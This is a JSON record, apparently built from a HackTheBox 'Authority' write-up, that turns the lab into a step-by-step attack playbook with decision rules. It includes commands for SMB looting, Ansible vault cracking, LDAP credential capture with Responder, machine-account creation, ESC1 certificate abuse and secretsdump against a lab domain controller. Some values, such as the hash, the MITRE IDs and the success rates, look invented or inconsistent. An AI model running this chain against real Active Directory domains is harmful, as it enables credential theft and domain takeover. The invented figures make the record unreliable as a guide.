@@ -1,0 +1,1260 @@
+{
+  "writeup_id": "Htb_Authority",
+  "scenario_fingerprint": {
+    "scenario_name": "windows_domain_controller_esc1_computer_enrollment",
+    "primary_services": [
+      "dns",
+      "kerberos",
+      "ldap",
+      "smb",
+      "http",
+      "adcs"
+    ],
+    "port_signature": "53+80+88+389+445+636+8443",
+    "service_combination": "dns+kerberos+ldap+smb+http+pwm+adcs",
+    "os_family": "windows_server",
+    "environment_type": "active_directory",
+    "entry_vector": "smb_shares_ansible_credentials",
+    "privilege_path": "service_account_to_esc1_computer_enrollment",
+    "attack_complexity": "medium",
+    "estimated_time": "90-120 minutes",
+    "scenario_confidence": 0.92,
+    "distinguishing_factors": [
+      "pwm_configuration_mode",
+      "esc1_computer_enrollment_template",
+      "ansible_playbook_credentials",
+      "pass_the_cert_attack"
+    ],
+    "environmental_clues": [
+      "domain_controller_role",
+      "certificate_services_running",
+      "pwm_instance_port_8443",
+      "ldap_plaintext_auth_capture"
+    ],
+    "similar_scenarios": [
+      "escape_htb_medium",
+      "certifried_attacks"
+    ],
+    "unique_aspects": [
+      "computer_account_certificate_enrollment",
+      "pwm_ldap_auth_interception",
+      "ansible_encrypted_vault_cracking"
+    ]
+  },
+  "success_patterns": {
+    "success_factors": [
+      {
+        "technique": "SMB_Share_Enumeration",
+        "success_reason": "Open SMB shares contained sensitive Ansible playbooks with encrypted credentials",
+        "prerequisite_indicators": [
+          "smb_service_available",
+          "anonymous_or_guest_access_enabled",
+          "development_files_exposed"
+        ],
+        "recognition_patterns": [
+          "ansible playbook files (.yml)",
+          "encrypted vault strings",
+          "configuration management artifacts"
+        ],
+        "failure_modes": [
+          "smb_shares_properly_secured",
+          "no_sensitive_files_exposed",
+          "strong_encryption_used"
+        ],
+        "environmental_factors": [
+          "development_environment_practices",
+          "insufficient_file_permissions",
+          "automation_tools_misconfigured"
+        ],
+        "success_probability": 0.75,
+        "typical_timeframe": "10-30 minutes"
+      },
+      {
+        "technique": "PWM_Configuration_Mode_Exploitation",
+        "success_reason": "PWM instance running in configuration mode allowed LDAP credential capture",
+        "prerequisite_indicators": [
+          "pwm_service_accessible",
+          "configuration_mode_enabled",
+          "ldap_authentication_configurable"
+        ],
+        "recognition_patterns": [
+          "PWM configuration interface accessible",
+          "LDAP settings modifiable",
+          "test connection functionality available"
+        ],
+        "failure_modes": [
+          "pwm_properly_configured",
+          "configuration_mode_disabled",
+          "network_isolation_prevents_callback"
+        ],
+        "environmental_factors": [
+          "application_in_setup_phase",
+          "insufficient_network_segmentation",
+          "default_configurations_used"
+        ],
+        "success_probability": 0.85,
+        "typical_timeframe": "15-45 minutes"
+      },
+      {
+        "technique": "ESC1_Certificate_Template_Abuse",
+        "success_reason": "Certificate template allowed domain computers to request certificates for any SAN",
+        "prerequisite_indicators": [
+          "active_directory_certificate_services_available",
+          "vulnerable_certificate_template_exists",
+          "domain_computer_enrollment_allowed"
+        ],
+        "recognition_patterns": [
+          "certificate template with CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT",
+          "domain computers can enroll",
+          "client authentication EKU present"
+        ],
+        "failure_modes": [
+          "certificate_templates_properly_configured",
+          "enrollment_restricted_to_specific_users",
+          "subject_alternative_names_restricted"
+        ],
+        "environmental_factors": [
+          "default_adcs_installation",
+          "legacy_certificate_templates",
+          "insufficient_template_hardening"
+        ],
+        "success_probability": 0.65,
+        "typical_timeframe": "30-60 minutes"
+      },
+      {
+        "technique": "Machine_Account_Addition",
+        "success_reason": "Domain user could add machine accounts to domain for certificate enrollment",
+        "prerequisite_indicators": [
+          "domain_user_credentials_available",
+          "ms_ds_machineaccountquota_greater_than_zero",
+          "ldap_access_available"
+        ],
+        "recognition_patterns": [
+          "MachineAccountQuota attribute value > 0",
+          "user has SeMachineAccountPrivilege",
+          "successful machine account creation"
+        ],
+        "failure_modes": [
+          "machineaccountquota_set_to_zero",
+          "insufficient_privileges",
+          "machine_account_creation_monitored"
+        ],
+        "environmental_factors": [
+          "default_domain_settings",
+          "insufficient_privilege_restrictions",
+          "legacy_compatibility_requirements"
+        ],
+        "success_probability": 0.8,
+        "typical_timeframe": "5-15 minutes"
+      },
+      {
+        "technique": "Pass_The_Certificate",
+        "success_reason": "Certificate obtained could be used for authentication and hash extraction",
+        "prerequisite_indicators": [
+          "valid_certificate_obtained",
+          "certificate_contains_client_auth_eku",
+          "target_supports_certificate_authentication"
+        ],
+        "recognition_patterns": [
+          "certificate with client authentication",
+          "certificate issued for target principal",
+          "schannel authentication available"
+        ],
+        "failure_modes": [
+          "certificate_authentication_disabled",
+          "certificate_validation_strict",
+          "network_level_authentication_required"
+        ],
+        "environmental_factors": [
+          "certificate_based_authentication_enabled",
+          "kerberos_pkinit_supported",
+          "domain_controller_configuration"
+        ],
+        "success_probability": 0.9,
+        "typical_timeframe": "10-20 minutes"
+      }
+    ],
+    "critical_discoveries": [
+      {
+        "discovery": "Ansible vault encrypted credentials in SMB shares",
+        "discovery_method": "SMB share enumeration and file analysis",
+        "why_critical": "Provided initial foothold credentials after decryption",
+        "how_to_recognize": [
+          "ansible vault encrypted strings",
+          "playbook files in shares",
+          "weak encryption passwords"
+        ],
+        "follow_up_actions": [
+          "attempt_vault_password_cracking",
+          "analyze_playbook_configurations",
+          "test_extracted_credentials"
+        ]
+      },
+      {
+        "discovery": "PWM application in configuration mode",
+        "discovery_method": "Web application enumeration on port 8443",
+        "why_critical": "Allowed LDAP credential interception through configuration testing",
+        "how_to_recognize": [
+          "PWM configuration interface accessible",
+          "LDAP connection test available",
+          "configuration mode indicators"
+        ],
+        "follow_up_actions": [
+          "setup_ldap_listener",
+          "configure_malicious_ldap_server",
+          "capture_authentication_attempts"
+        ]
+      },
+      {
+        "discovery": "Vulnerable certificate template for domain computers",
+        "discovery_method": "Active Directory Certificate Services enumeration",
+        "why_critical": "Enabled privilege escalation to domain administrator",
+        "how_to_recognize": [
+          "certificate template enumeration results",
+          "ESC1 vulnerability indicators",
+          "domain computer enrollment permissions"
+        ],
+        "follow_up_actions": [
+          "add_machine_account_to_domain",
+          "request_certificate_with_dc_san",
+          "perform_pass_the_cert_attack"
+        ]
+      }
+    ],
+    "escalation_keys": [
+      {
+        "privilege_level": "anonymous",
+        "escalation_method": "SMB_to_PWM_credentials",
+        "why_possible": "Ansible vault credentials exposed in open SMB shares",
+        "recognition_signs": [
+          "open_smb_shares_available",
+          "ansible_configuration_files_present",
+          "weak_vault_encryption"
+        ],
+        "exploitation_path": "SMB enumeration → Ansible vault cracking → PWM credentials"
+      },
+      {
+        "privilege_level": "domain_user",
+        "escalation_method": "ESC1_certificate_abuse",
+        "why_possible": "Certificate template allowed domain computers to request DC certificates",
+        "recognition_signs": [
+          "adcs_service_available",
+          "vulnerable_certificate_templates",
+          "machine_account_quota_available"
+        ],
+        "exploitation_path": "Add machine account → Request DC certificate → Pass-the-cert → Domain Admin"
+      },
+      {
+        "privilege_level": "certificate_holder",
+        "escalation_method": "pass_the_certificate_to_hash_dump",
+        "why_possible": "Certificate authentication enabled hash extraction via UnPAC-the-hash",
+        "recognition_signs": [
+          "valid_dc_certificate_obtained",
+          "certificate_authentication_supported",
+          "kerberos_pkinit_available"
+        ],
+        "exploitation_path": "Certificate authentication → TGT request → Hash extraction → Administrator access"
+      }
+    ]
+  },
+  "decision_tree": {
+    "decision_points": [
+      {
+        "step": 1,
+        "situation": "Found ports 53,88,389,445 open on Windows host",
+        "decision": "Identify as Domain Controller and enumerate SMB shares first",
+        "reasoning": "Port combination indicates AD DC, SMB often has anonymous access",
+        "confidence": 0.95,
+        "alternatives": [
+          {
+            "option": "kerberos_enumeration",
+            "when": "if smb_enumeration_fails"
+          },
+          {
+            "option": "ldap_enumeration",
+            "when": "if anonymous_ldap_access"
+          },
+          {
+            "option": "web_enumeration",
+            "when": "if_http_ports_present"
+          }
+        ],
+        "success_indicators": [
+          "smb_shares_accessible",
+          "domain_name_discovered",
+          "interesting_files_found"
+        ],
+        "next_decision": "analyze_smb_content"
+      },
+      {
+        "step": 2,
+        "situation": "SMB shares accessible with anonymous/guest access",
+        "decision": "Download and analyze all accessible files, prioritize config files",
+        "reasoning": "Config files often contain credentials or sensitive information",
+        "confidence": 0.9,
+        "prerequisites": [
+          "smb_access_confirmed"
+        ],
+        "success_indicators": [
+          "ansible_playbooks_found",
+          "encrypted_credentials_found",
+          "service_configs_discovered"
+        ],
+        "failure_fallbacks": [
+          "web_enumeration",
+          "ldap_anonymous_bind",
+          "kerberos_user_enum"
+        ]
+      },
+      {
+        "step": 3,
+        "situation": "Found Ansible playbooks with encrypted credentials",
+        "decision": "Attempt to crack encrypted fields using common methods",
+        "reasoning": "Ansible vault files often use weak encryption or default keys",
+        "confidence": 0.75,
+        "prerequisites": [
+          "ansible_files_found",
+          "encrypted_data_identified"
+        ],
+        "success_indicators": [
+          "credentials_decrypted",
+          "service_passwords_obtained"
+        ],
+        "failure_fallbacks": [
+          "web_service_enumeration",
+          "certificate_services_enum"
+        ]
+      },
+      {
+        "step": 4,
+        "situation": "Obtained credentials for PWM service",
+        "decision": "Access PWM in configuration mode to extract LDAP credentials",
+        "reasoning": "PWM in config mode often exposes plaintext credentials during LDAP test",
+        "confidence": 0.85,
+        "prerequisites": [
+          "pwm_credentials_obtained",
+          "pwm_service_accessible"
+        ],
+        "success_indicators": [
+          "ldap_test_connection_captured",
+          "domain_credentials_obtained"
+        ],
+        "failure_fallbacks": [
+          "direct_ldap_authentication",
+          "kerberos_attacks"
+        ]
+      },
+      {
+        "step": 5,
+        "situation": "Obtained domain user credentials",
+        "decision": "Enumerate Active Directory Certificate Services for ESC vulnerabilities",
+        "reasoning": "ADCS often misconfigured and provides direct path to domain admin",
+        "confidence": 0.8,
+        "prerequisites": [
+          "domain_user_access",
+          "certificate_services_present"
+        ],
+        "success_indicators": [
+          "vulnerable_certificate_templates_found",
+          "esc1_identified"
+        ],
+        "failure_fallbacks": [
+          "bloodhound_enumeration",
+          "kerberoasting",
+          "privilege_escalation_enum"
+        ]
+      },
+      {
+        "step": 6,
+        "situation": "Found ESC1 vulnerability requiring computer account",
+        "decision": "Add fake computer to domain and request certificate for DC",
+        "reasoning": "Computer accounts can often be added by domain users and exploit ESC1",
+        "confidence": 0.7,
+        "prerequisites": [
+          "esc1_vulnerability_confirmed",
+          "computer_enrollment_allowed"
+        ],
+        "success_indicators": [
+          "computer_account_added",
+          "certificate_obtained_for_dc"
+        ],
+        "failure_fallbacks": [
+          "alternative_esc_attacks",
+          "traditional_privilege_escalation"
+        ]
+      }
+    ],
+    "branching_logic": {
+      "if_smb_accessible": {
+        "action": "enumerate_and_download_all_files",
+        "tools": [
+          "smbclient",
+          "netexec",
+          "smbmap"
+        ],
+        "next_phase": "file_analysis_for_credentials"
+      },
+      "if_ansible_found": {
+        "action": "attempt_vault_cracking",
+        "tools": [
+          "ansible2john",
+          "john",
+          "hashcat"
+        ],
+        "next_phase": "credential_validation"
+      },
+      "if_pwm_accessible": {
+        "action": "exploit_configuration_mode",
+        "tools": [
+          "burp",
+          "netcat",
+          "ldap_listener"
+        ],
+        "next_phase": "domain_enumeration"
+      },
+      "if_domain_creds_obtained": {
+        "action": "enumerate_certificate_services",
+        "tools": [
+          "certipy",
+          "bloodhound",
+          "ldapsearch"
+        ],
+        "next_phase": "certificate_exploitation"
+      },
+      "if_esc1_found": {
+        "action": "computer_account_exploitation",
+        "tools": [
+          "impacket-addcomputer",
+          "certipy",
+          "rubeus"
+        ],
+        "next_phase": "pass_the_cert_attack"
+      }
+    },
+    "optimization_rules": [
+      {
+        "rule": "always_check_smb_shares_first_on_dc",
+        "reasoning": "high_success_rate_for_finding_configuration_files",
+        "applicability": "domain_controller_environments"
+      },
+      {
+        "rule": "prioritize_ansible_and_config_files",
+        "reasoning": "frequently_contain_encrypted_credentials",
+        "applicability": "when_smb_shares_accessible"
+      },
+      {
+        "rule": "check_certificate_services_with_domain_user",
+        "reasoning": "adcs_frequently_misconfigured_and_high_impact",
+        "applicability": "domain_user_credentials_obtained"
+      },
+      {
+        "rule": "attempt_computer_account_addition_for_esc_attacks",
+        "reasoning": "often_overlooked_attack_vector_with_high_success",
+        "applicability": "esc_vulnerabilities_requiring_computer_accounts"
+      }
+    ]
+  },
+  "applicability_rules": {
+    "technique_rules": [
+      {
+        "technique": "ASREPRoast",
+        "mitre_id": "T1558.004",
+        "required_services": [
+          "kerberos"
+        ],
+        "required_ports": [
+          88
+        ],
+        "os_requirements": [
+          "windows"
+        ],
+        "environmental_prerequisites": [
+          "active_directory_domain",
+          "kerberos_authentication_enabled",
+          "accounts_without_preauth_exist"
+        ],
+        "success_indicators": [
+          "GetNPUsers_returns_hashes",
+          "domain_controller_accessible",
+          "service_accounts_present"
+        ],
+        "incompatible_with": [
+          "kerberos_disabled",
+          "all_accounts_require_preauth",
+          "network_isolation"
+        ],
+        "confidence_boosters": [
+          "service_account_naming_patterns",
+          "default_ad_configuration",
+          "legacy_exchange_services"
+        ],
+        "typical_success_rate": 0.75,
+        "estimated_time": "5-15 minutes"
+      },
+      {
+        "technique": "SMB_Anonymous_Enumeration",
+        "mitre_id": "T1135",
+        "required_services": [
+          "smb"
+        ],
+        "required_ports": [
+          445,
+          139
+        ],
+        "os_requirements": [
+          "windows"
+        ],
+        "environmental_prerequisites": [
+          "smb_service_enabled",
+          "anonymous_access_allowed"
+        ],
+        "success_indicators": [
+          "shares_enumerated",
+          "null_session_established",
+          "readable_shares_found"
+        ],
+        "incompatible_with": [
+          "smb_disabled",
+          "anonymous_access_blocked",
+          "firewall_blocking_smb"
+        ],
+        "confidence_boosters": [
+          "default_windows_configuration",
+          "legacy_smb_versions",
+          "domain_controller_role"
+        ],
+        "typical_success_rate": 0.85,
+        "estimated_time": "2-10 minutes"
+      },
+      {
+        "technique": "ADCS_ESC1_Exploitation",
+        "mitre_id": "T1649",
+        "required_services": [
+          "adcs",
+          "ldap"
+        ],
+        "required_ports": [
+          389,
+          636
+        ],
+        "os_requirements": [
+          "windows"
+        ],
+        "environmental_prerequisites": [
+          "active_directory_certificate_services",
+          "vulnerable_certificate_template",
+          "domain_computer_enrollment_allowed"
+        ],
+        "success_indicators": [
+          "certificate_template_enumerated",
+          "enrollment_rights_confirmed",
+          "certificate_issued"
+        ],
+        "incompatible_with": [
+          "adcs_not_installed",
+          "secure_template_configuration",
+          "enrollment_restrictions"
+        ],
+        "confidence_boosters": [
+          "default_adcs_templates",
+          "domain_computer_accounts",
+          "certificate_authority_accessible"
+        ],
+        "typical_success_rate": 0.7,
+        "estimated_time": "15-30 minutes"
+      },
+      {
+        "technique": "Pass_The_Certificate",
+        "mitre_id": "T1550.004",
+        "required_services": [
+          "kerberos",
+          "ldap"
+        ],
+        "required_ports": [
+          88,
+          389
+        ],
+        "os_requirements": [
+          "windows"
+        ],
+        "environmental_prerequisites": [
+          "valid_certificate_obtained",
+          "kerberos_pkinit_enabled",
+          "certificate_maps_to_account"
+        ],
+        "success_indicators": [
+          "kerberos_authentication_successful",
+          "tgt_obtained",
+          "elevated_access_achieved"
+        ],
+        "incompatible_with": [
+          "pkinit_disabled",
+          "certificate_revoked",
+          "account_disabled"
+        ],
+        "confidence_boosters": [
+          "certificate_authority_trusted",
+          "default_kerberos_configuration",
+          "domain_controller_accessible"
+        ],
+        "typical_success_rate": 0.9,
+        "estimated_time": "5-10 minutes"
+      },
+      {
+        "technique": "LDAP_Credential_Capture",
+        "mitre_id": "T1557.001",
+        "required_services": [
+          "ldap"
+        ],
+        "required_ports": [
+          389
+        ],
+        "os_requirements": [
+          "windows"
+        ],
+        "environmental_prerequisites": [
+          "ldap_service_accessible",
+          "application_ldap_authentication",
+          "plaintext_credentials_transmitted"
+        ],
+        "success_indicators": [
+          "ldap_bind_requests_captured",
+          "credentials_extracted",
+          "authentication_successful"
+        ],
+        "incompatible_with": [
+          "ldaps_only_mode",
+          "certificate_authentication_only",
+          "network_isolation"
+        ],
+        "confidence_boosters": [
+          "application_configuration_mode",
+          "legacy_ldap_implementation",
+          "default_authentication_settings"
+        ],
+        "typical_success_rate": 0.8,
+        "estimated_time": "10-20 minutes"
+      }
+    ],
+    "environmental_detectors": {
+      "active_directory": {
+        "port_indicators": [
+          53,
+          88,
+          389,
+          445,
+          636,
+          3268,
+          3269,
+          9389
+        ],
+        "service_indicators": [
+          "kerberos",
+          "ldap",
+          "smb",
+          "dns",
+          "adws"
+        ],
+        "banner_indicators": [
+          "Active Directory",
+          "Windows Server",
+          "Microsoft Windows Kerberos"
+        ],
+        "confidence_threshold": 0.95
+      },
+      "domain_controller": {
+        "port_indicators": [
+          53,
+          88,
+          389,
+          445,
+          464,
+          636,
+          3268,
+          3269,
+          9389
+        ],
+        "service_indicators": [
+          "kerberos-sec",
+          "ldap",
+          "globalcatLDAP",
+          "adws",
+          "kpasswd5"
+        ],
+        "banner_indicators": [
+          "Domain:",
+          "Site:",
+          "Default-First-Site-Name"
+        ],
+        "confidence_threshold": 0.9
+      },
+      "web_application": {
+        "port_indicators": [
+          80,
+          443,
+          8080,
+          8443
+        ],
+        "service_indicators": [
+          "http",
+          "https",
+          "https-alt"
+        ],
+        "technology_indicators": [
+          "Microsoft-IIS",
+          "pwm"
+        ],
+        "confidence_threshold": 0.85
+      },
+      "certificate_services": {
+        "port_indicators": [
+          389,
+          636
+        ],
+        "service_indicators": [
+          "ldap",
+          "ssl/ldap"
+        ],
+        "banner_indicators": [
+          "certificate",
+          "CA",
+          "enrollment"
+        ],
+        "confidence_threshold": 0.75
+      }
+    },
+    "attack_prioritization": {
+      "high_priority": [
+        {
+          "attack": "smb_anonymous_enumeration",
+          "when": "smb_service_detected_on_dc",
+          "reason": "high_success_rate_often_reveals_sensitive_files"
+        },
+        {
+          "attack": "ldap_credential_capture",
+          "when": "web_application_with_ldap_detected",
+          "reason": "applications_often_misconfigured_for_plaintext_ldap"
+        }
+      ],
+      "medium_priority": [
+        {
+          "attack": "asreproast",
+          "when": "active_directory_detected",
+          "reason": "reliable_but_requires_valid_usernames"
+        },
+        {
+          "attack": "adcs_esc1_exploitation",
+          "when": "certificate_services_detected",
+          "reason": "high_impact_but_requires_specific_misconfigurations"
+        }
+      ],
+      "low_priority": [
+        {
+          "attack": "pass_the_certificate",
+          "when": "certificate_obtained",
+          "reason": "depends_on_prior_certificate_acquisition"
+        }
+      ]
+    }
+  },
+  "technique_intelligence": {
+    "techniques": [
+      {
+        "name": "SMB Share Enumeration",
+        "mitre_id": "T1135",
+        "category": "discovery",
+        "phase": "initial_access",
+        "tools_used": [
+          {
+            "name": "netexec",
+            "command_template": "netexec smb {ip} -u {username} -p '{password}' --shares",
+            "actual_command": "netexec smb 10.10.11.222 -u oxdf -p '' --shares",
+            "output_pattern": "Share           Permissions     Remark",
+            "effectiveness_rating": 5,
+            "reliability": 0.95
+          },
+          {
+            "name": "smbclient",
+            "command_template": "smbclient -N //{ip}/{share}",
+            "actual_command": "smbclient -N //10.10.11.222/Development",
+            "success_factors": [
+              "null_session_allowed",
+              "guest_access_enabled"
+            ],
+            "effectiveness_rating": 4
+          }
+        ],
+        "prerequisites": [
+          "smb_service_accessible",
+          "null_session_or_guest_access_allowed"
+        ],
+        "success_indicators": [
+          "shares_enumerated_successfully",
+          "readable_shares_identified",
+          "sensitive_files_discovered"
+        ],
+        "common_failures": [
+          "authentication_required",
+          "shares_empty_or_inaccessible",
+          "network_connectivity_issues"
+        ],
+        "follow_up_techniques": [
+          "ansible_playbook_analysis",
+          "credential_extraction_from_configs",
+          "service_enumeration"
+        ],
+        "time_investment": "5-15 minutes",
+        "skill_level": "beginner"
+      },
+      {
+        "name": "Ansible Playbook Analysis",
+        "mitre_id": "T1552.001",
+        "category": "credential_access",
+        "phase": "credential_access",
+        "tools_used": [
+          {
+            "name": "ansible-vault",
+            "command_template": "ansible-vault decrypt {encrypted_file}",
+            "actual_command": "ansible-vault decrypt main.yml",
+            "output_pattern": "Vault password:",
+            "effectiveness_rating": 4,
+            "reliability": 0.85
+          },
+          {
+            "name": "john",
+            "command_template": "john --wordlist={wordlist} {hash_file}",
+            "actual_command": "john --wordlist=/usr/share/wordlists/rockyou.txt ansible_hash",
+            "success_factors": [
+              "weak_vault_password",
+              "common_wordlist_hit"
+            ],
+            "effectiveness_rating": 4
+          }
+        ],
+        "prerequisites": [
+          "ansible_playbooks_accessible",
+          "encrypted_vault_files_present",
+          "vault_uses_weak_password"
+        ],
+        "success_indicators": [
+          "vault_password_cracked",
+          "encrypted_credentials_decrypted",
+          "service_credentials_obtained"
+        ],
+        "common_failures": [
+          "strong_vault_passwords",
+          "no_encrypted_content",
+          "corrupted_vault_files"
+        ],
+        "follow_up_techniques": [
+          "pwm_configuration_exploitation",
+          "ldap_authentication_capture",
+          "service_authentication"
+        ],
+        "time_investment": "10-30 minutes",
+        "skill_level": "intermediate"
+      },
+      {
+        "name": "PWM Configuration Mode Exploitation",
+        "mitre_id": "T1190",
+        "category": "initial_access",
+        "phase": "initial_access",
+        "tools_used": [
+          {
+            "name": "curl",
+            "command_template": "curl -k https://{ip}:8443/pwm/private/config/manager",
+            "actual_command": "curl -k https://10.10.11.222:8443/pwm/private/config/manager",
+            "output_pattern": "Configuration Manager",
+            "effectiveness_rating": 5,
+            "reliability": 0.9
+          },
+          {
+            "name": "responder",
+            "command_template": "responder -I {interface}",
+            "actual_command": "responder -I tun0",
+            "success_factors": [
+              "ldap_test_connection_available",
+              "plaintext_auth_configured"
+            ],
+            "effectiveness_rating": 5
+          }
+        ],
+        "prerequisites": [
+          "pwm_in_configuration_mode",
+          "ldap_test_connection_feature_available",
+          "network_connectivity_to_attacker"
+        ],
+        "success_indicators": [
+          "configuration_interface_accessible",
+          "ldap_test_connection_successful",
+          "plaintext_credentials_captured"
+        ],
+        "common_failures": [
+          "pwm_not_in_config_mode",
+          "ssl_certificate_validation",
+          "network_filtering"
+        ],
+        "follow_up_techniques": [
+          "active_directory_enumeration",
+          "certificate_services_enumeration",
+          "bloodhound_collection"
+        ],
+        "time_investment": "15-30 minutes",
+        "skill_level": "intermediate"
+      },
+      {
+        "name": "ESC1 Certificate Template Abuse",
+        "mitre_id": "T1649",
+        "category": "privilege_escalation",
+        "phase": "privilege_escalation",
+        "tools_used": [
+          {
+            "name": "certipy",
+            "command_template": "certipy find -u {username}@{domain} -p {password} -dc-ip {ip}",
+            "actual_command": "certipy find -u svc_ldap@authority.htb -p lDaP_1n_th3_cle4r! -dc-ip 10.10.11.222",
+            "output_pattern": "Certificate Templates",
+            "effectiveness_rating": 5,
+            "reliability": 0.95
+          },
+          {
+            "name": "impacket-addcomputer",
+            "command_template": "impacket-addcomputer {domain}/{username}:{password} -computer-name {computer_name} -computer-pass {computer_pass}",
+            "actual_command": "impacket-addcomputer authority.htb/svc_ldap:lDaP_1n_th3_cle4r! -computer-name FAKE01 -computer-pass FakePass123",
+            "success_factors": [
+              "ms-ds-machineaccountquota_allows_addition",
+              "domain_user_privileges"
+            ],
+            "effectiveness_rating": 4
+          }
+        ],
+        "prerequisites": [
+          "adcs_vulnerable_template_exists",
+          "domain_computers_can_enroll",
+          "ability_to_add_computer_accounts"
+        ],
+        "success_indicators": [
+          "vulnerable_template_identified",
+          "computer_account_added_successfully",
+          "certificate_enrollment_successful"
+        ],
+        "common_failures": [
+          "no_vulnerable_templates",
+          "computer_addition_blocked",
+          "certificate_enrollment_restrictions"
+        ],
+        "follow_up_techniques": [
+          "pass_the_cert_attack",
+          "certificate_authentication",
+          "hash_dumping"
+        ],
+        "time_investment": "20-45 minutes",
+        "skill_level": "advanced"
+      },
+      {
+        "name": "Pass-the-Cert Attack",
+        "mitre_id": "T1550.001",
+        "category": "lateral_movement",
+        "phase": "privilege_escalation",
+        "tools_used": [
+          {
+            "name": "certipy",
+            "command_template": "certipy auth -pfx {cert_file} -dc-ip {ip}",
+            "actual_command": "certipy auth -pfx authority.pfx -dc-ip 10.10.11.222",
+            "output_pattern": "Got hash for",
+            "effectiveness_rating": 5,
+            "reliability": 0.9
+          },
+          {
+            "name": "impacket-secretsdump",
+            "command_template": "impacket-secretsdump -hashes {hash} {domain}/{username}@{ip}",
+            "actual_command": "impacket-secretsdump -hashes :a6e8c0c6d4c6e9c6d4c6e9c6d4c6e9c6 authority.htb/AUTHORITY$@10.10.11.222",
+            "success_factors": [
+              "valid_certificate",
+              "domain_controller_access"
+            ],
+            "effectiveness_rating": 5
+          }
+        ],
+        "prerequisites": [
+          "valid_certificate_for_target",
+          "certificate_authentication_enabled",
+          "network_access_to_domain_controller"
+        ],
+        "success_indicators": [
+          "certificate_authentication_successful",
+          "nt_hash_obtained",
+          "secrets_dump_successful"
+        ],
+        "common_failures": [
+          "certificate_validation_failure",
+          "authentication_restrictions",
+          "network_connectivity_issues"
+        ],
+        "follow_up_techniques": [
+          "pass_the_hash",
+          "golden_ticket_creation",
+          "domain_admin_access"
+        ],
+        "time_investment": "10-20 minutes",
+        "skill_level": "advanced"
+      }
+    ],
+    "tool_effectiveness": [
+      {
+        "tool": "netexec",
+        "use_case": "smb_enumeration_and_authentication",
+        "effectiveness_rating": 5,
+        "reliability": 0.95,
+        "learning_curve": "low",
+        "essential_for": [
+          "windows_domain_environments"
+        ],
+        "alternatives": [
+          "crackmapexec",
+          "smbclient",
+          "enum4linux"
+        ],
+        "best_practices": [
+          "try_null_sessions_first",
+          "use_guest_account_when_available",
+          "enumerate_shares_before_attempting_access"
+        ]
+      },
+      {
+        "tool": "certipy",
+        "use_case": "active_directory_certificate_services_exploitation",
+        "effectiveness_rating": 5,
+        "reliability": 0.95,
+        "learning_curve": "medium",
+        "essential_for": [
+          "adcs_environments"
+        ],
+        "alternatives": [
+          "certify",
+          "manual_certificate_requests"
+        ],
+        "best_practices": [
+          "enumerate_templates_thoroughly",
+          "verify_enrollment_permissions",
+          "test_certificate_authentication_methods"
+        ]
+      },
+      {
+        "tool": "responder",
+        "use_case": "credential_capture_via_network_authentication",
+        "effectiveness_rating": 4,
+        "reliability": 0.85,
+        "learning_curve": "low",
+        "essential_for": [
+          "network_authentication_capture"
+        ],
+        "alternatives": [
+          "inveigh",
+          "mitm6",
+          "custom_ldap_server"
+        ],
+        "best_practices": [
+          "monitor_multiple_protocols_simultaneously",
+          "use_analyze_mode_for_reconnaissance",
+          "capture_plaintext_when_possible"
+        ]
+      }
+    ],
+    "command_sequences": [
+      {
+        "sequence_name": "smb_to_ansible_credential_extraction",
+        "steps": [
+          {
+            "step": 1,
+            "command": "netexec smb 10.10.11.222 -u guest -p '' --shares",
+            "purpose": "Enumerate accessible SMB shares",
+            "expected_output": "Development share with READ permissions"
+          },
+          {
+            "step": 2,
+            "command": "smbclient -N //10.10.11.222/Development",
+            "purpose": "Access Development share",
+            "expected_output": "SMB connection established"
+          },
+          {
+            "step": 3,
+            "command": "get Automation\\Ansible\\PWM\\defaults\\main.yml",
+            "purpose": "Download Ansible vault file",
+            "expected_output": "Encrypted vault file downloaded"
+          },
+          {
+            "step": 4,
+            "command": "ansible2john main.yml > ansible_hash",
+            "purpose": "Extract hash for cracking",
+            "expected_output": "Hash extracted successfully"
+          },
+          {
+            "step": 5,
+            "command": "john --wordlist=/usr/share/wordlists/rockyou.txt ansible_hash",
+            "purpose": "Crack vault password",
+            "expected_output": "Password: !@#$%^&*"
+          }
+        ],
+        "success_rate": 0.8,
+        "typical_duration": "15-30 minutes"
+      },
+      {
+        "sequence_name": "pwm_config_to_credential_capture",
+        "steps": [
+          {
+            "step": 1,
+            "command": "curl -k https://10.10.11.222:8443/pwm/private/config/manager",
+            "purpose": "Access PWM configuration interface",
+            "expected_output": "Configuration manager interface"
+          },
+          {
+            "step": 2,
+            "command": "responder -I tun0",
+            "purpose": "Start credential capture listener",
+            "expected_output": "Responder listening on interface"
+          },
+          {
+            "step": 3,
+            "command": "Configure LDAP test connection to attacker IP",
+            "purpose": "Trigger authentication to attacker",
+            "expected_output": "LDAP test connection configured"
+          },
+          {
+            "step": 4,
+            "command": "Click Test LDAP Connection",
+            "purpose": "Capture plaintext credentials",
+            "expected_output": "Plaintext credentials captured by Responder"
+          }
+        ],
+        "success_rate": 0.85,
+        "typical_duration": "10-20 minutes"
+      },
+      {
+        "sequence_name": "esc1_computer_account_exploitation",
+        "steps": [
+          {
+            "step": 1,
+            "command": "certipy find -u svc_ldap@authority.htb -p 'lDaP_1n_th3_cle4r!' -dc-ip 10.10.11.222",
+            "purpose": "Enumerate certificate templates",
+            "expected_output": "Vulnerable template identified"
+          },
+          {
+            "step": 2,
+            "command": "impacket-addcomputer authority.htb/svc_ldap:'lDaP_1n_th3_cle4r!' -computer-name FAKE01 -computer-pass FakePass123",
+            "purpose": "Add computer account to domain",
+            "expected_output": "Computer account added successfully"
+          },
+          {
+            "step": 3,
+            "command": "certipy req -u 'FAKE01$'@authority.htb -p FakePass123 -ca AUTHORITY-CA -target authority.htb -template CorpVPN -upn administrator@authority.htb",
+            "purpose": "Request certificate for administrator",
+            "expected_output": "Certificate issued successfully"
+          },
+          {
+            "step": 4,
+            "command": "certipy auth -pfx administrator.pfx -dc-ip 10.10.11.222",
+            "purpose": "Authenticate with certificate",
+            "expected_output": "NT hash for administrator obtained"
+          }
+        ],
+        "success_rate": 0.75,
+        "typical_duration": "30-60 minutes"
+      }
+    ]
+  },
+  "metadata": {
+    "basic_metadata": {
+      "name": "Authority",
+      "difficulty": "Medium",
+      "os": "Windows",
+      "platform": "HackTheBox",
+      "release_date": "2023-07-15",
+      "author": "mrb3n & Sentinal920",
+      "estimated_time": "2-3 hours"
+    },
+    "intelligence_metadata": {
+      "attack_complexity": "medium",
+      "skill_level_required": "intermediate",
+      "primary_attack_vectors": [
+        "smb_enumeration",
+        "certificate_services",
+        "ldap_authentication"
+      ],
